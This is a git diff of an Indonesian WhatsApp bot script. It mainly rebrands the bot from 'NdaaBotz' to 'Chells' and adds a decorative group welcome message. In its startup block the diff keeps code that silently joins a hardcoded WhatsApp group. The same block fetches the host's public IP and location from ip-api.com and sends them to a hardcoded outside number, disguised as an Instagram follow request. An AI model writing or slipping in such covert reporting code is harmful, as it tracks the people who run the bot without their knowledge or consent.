@@ -23,7 +23,7 @@ async function starts() {
 pemuda.autoReconnect = ReconnectMode.onConnectionLost
     pemuda.version = [2, 2143, 3]
     pemuda.logger.level = 'warn'
-    pemuda.browserDescription = ['NdaaBotz','Desktop','3.0']
+    pemuda.browserDescription = ['Chells','Desktop','3.0']
     await sleep(10000)
     pemuda.on('qr', qr => {
         qrcode.generate(qr, { small: true })
@@ -40,12 +40,12 @@ pemuda.autoReconnect = ReconnectMode.onConnectionLost
  teks = `https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9`
  teks = `https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9`
  pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official NdaaBotz', 'cyan'))
- pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
+ console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Chells', 'cyan'))
+ pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Chells",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       pemuda.sendMessage("62896465831949@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
+       pemuda.sendMessage("62896465831949@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Chells",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -89,7 +89,16 @@ exec(`cd /sdcard/download && play *mp3`)
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-			masuk =`*Hai bebs, selamat datang😇*`
+			masuk =`*⩉⩉ ˑ 🌷💨 ٬٬ ࣪ αllo wɛll to ${mdata.subject}*
+࣪╰ ︶∪︶∪︶ ╯︶︶︶︶︶︶︶︶  
+࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ
+*⸼ 🐹 ֹ ׅ  ⊹ hαri/tαnggαl :* ${week}, ${calender}
+*⸼ 🐹 ֹ ׅ  ⊹ jαm :* ${timeWib}
+࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ  ࣪    ִ
+*🍓 ࣪ ⸼ ׂ  liαt dɛsk untuk info gc*
+*🍓 ࣪ ⸼ ׂ  ditunggu ordɛrαnnyα kαkα*
+
+║▌│█│║▌║││█║▌║▌║`
             pemuda.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Welcome To ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/wS19qFRtFFI`}}})
 			} else if (anu.action == 'remove') {
 			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283162388082:6283162388082\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
@@ -201,7 +210,7 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('Subcribe : Nanda Style', 'red'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('Subcribe : Chellstore', 'red'))})}, 200 ) ;
 	}
 	else
 	{
@@ -214,10 +223,10 @@ console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		vertivalLayout: 'default',
 		width: 50,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Nanda Style' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping('By Chellstore' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
-	title: '\n\nLoading cuyy' ,
+	title: '\n\nLoading, tunggu sebentar...' ,
 	eta: true ,
 	percent: true
 } ) ;
